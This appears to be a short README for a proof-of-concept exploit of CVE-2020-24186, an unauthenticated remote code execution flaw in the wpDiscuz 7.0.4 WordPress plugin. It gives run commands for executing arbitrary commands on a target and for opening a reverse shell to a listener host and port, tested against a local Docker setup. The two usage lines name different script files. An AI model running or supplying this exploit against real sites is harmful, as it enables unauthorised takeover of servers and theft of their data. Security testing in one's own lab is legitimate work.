# wpDiscuz-7.0.4-PoC-RCE

- wpDiscuz 7.0.4 - Unauthenticated RCE
- Exploit Autor: Carlos Tuma - Bl4dsc4n
- CVE-2020-24186
- WordPress 6.9
- Debian GNU/Linux 10
- Testado: Linux 9ee0774a1fee 6.6.87.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun  5 18:30:46 UTC 2025 x86_64 GNU/Linux
- Plugin: https://www.exploit-db.com/apps/fa264c5e9e21392cac3cf926becb0abe-wpdiscuz.7.0.4.zip
- Docker / Linux compatible
- Modes:
-  - Command execution
-  - Reverse shell (/bin/sh)
- modificado https://www.exploit-db.com/exploits/49967

# Remote code execute
python3 wpdiscuz_rce.py   -u http://localhost:8080   -p "/?p=1" --cmd "id"

# reverse shell
python3 exploit.py -u http://localhost:8080 -p "/?p=1" --reverse --lhost 172.17.0.1 --lport 4444
